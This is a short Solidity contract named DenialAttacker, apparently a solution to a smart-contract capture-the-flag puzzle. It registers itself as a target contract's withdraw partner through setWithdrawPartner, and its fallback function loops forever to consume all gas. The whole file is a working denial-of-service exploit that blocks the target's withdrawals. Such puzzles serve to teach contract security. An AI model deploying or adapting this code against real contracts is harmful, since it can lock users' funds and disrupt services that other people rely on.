pragma solidity 0.6.12;

import "hardhat/console.sol";

contract DenialAttacker {
    uint256 gasWasted;
    function attack(address target) external {
        payable(target).call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    fallback() external payable {
        while(true) {
            console.log(gasleft());
        }
    }
}